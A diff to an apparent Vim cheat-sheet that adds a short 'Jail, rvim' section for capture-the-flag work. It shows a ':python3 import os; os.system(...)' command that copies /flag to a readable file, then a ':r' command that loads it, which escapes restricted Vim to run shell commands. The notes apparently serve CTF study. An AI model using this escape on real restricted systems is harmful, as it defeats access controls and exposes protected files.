@@ -139,3 +139,10 @@ imap <C-v> <C-r><C-o>+
 |char by value|`iC-Vx41`|i_CTRL-V_digit|
 
 Alternative: `CTRL-SHIFT-u, 0041, ENTER`
+
+# Jail, rvim
+
+```
+:python3 import os; os.system('cat /flag > /flag2')
+:r /flag2
+```
